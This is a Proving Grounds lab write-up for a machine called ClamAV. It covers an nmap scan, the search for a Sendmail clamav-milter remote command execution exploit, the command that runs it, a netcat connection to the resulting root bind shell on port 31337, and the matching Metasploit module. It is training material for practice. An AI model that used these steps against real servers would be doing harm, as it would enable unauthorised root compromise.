---
description: Proving Grounds PG practice ClamAV writeup
---

# ClamAV

## Nmap

```
sudo nmap 192.168.142.42 -Pn -p- -sS -sV

PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
25/tcp    open     smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
53/tcp    filtered domain
80/tcp    open     http        Apache httpd 1.3.33 ((Debian GNU/Linux))
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp   open     smux        Linux SNMP multiplexer
445/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
60000/tcp open     ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
Service Info: Host: localhost.localdomain; OSs: Linux
Unix; CPE: cpe:/o:linux:linux_kernel
```

After going through all available ports I was unable to enumerate anything interesting...

With no promising avenues for the available ports. We turn to the machine hostname 'ClamAV'. ClamAV is an open source Antivirus solution available here on the vendors website: [https://www.clamav.net/](https://www.clamav.net).

Using `searchsploit` we see an available exploit:

**`Sendmail`**` `` ``with clamav-milter < 0.91.2 - Remote Command Execution ` (As we know port 25 is open and running Sendmail).

![](<../../../.gitbook/assets/image (1913).png>)

\*\*Linked here: \*\*

{% embed url="https://www.exploit-db.com/exploits/4761" %}

Looking through the exploit code we can see the script will open up port 31337 to receive connections on.

![](<../../../.gitbook/assets/image (1914).png>)

The script was then executed with the following command.

```
perl clamav.pl 192.168.142.42
```

![](<../../../.gitbook/assets/image (1915).png>)

Scanning port 31337 after running the exploit shows it as now being open.

![](<../../../.gitbook/assets/image (1916).png>)

We can then use `netcat` to connect to the port as the root user.

```
nc 192.168.142.42 31337
```

![](<../../../.gitbook/assets/image (1917).png>)

### Metasploit

A module for `Metasploit` exists for this vulnerability.

```
use exploit/unix/smtp/clamav_milter_blackhole
```

The exploit was configured with the options shown below.

![](<../../../.gitbook/assets/image (1911).png>)

Upon execution we are able to gain root access to the target system.

![](<../../../.gitbook/assets/image (1912).png>)
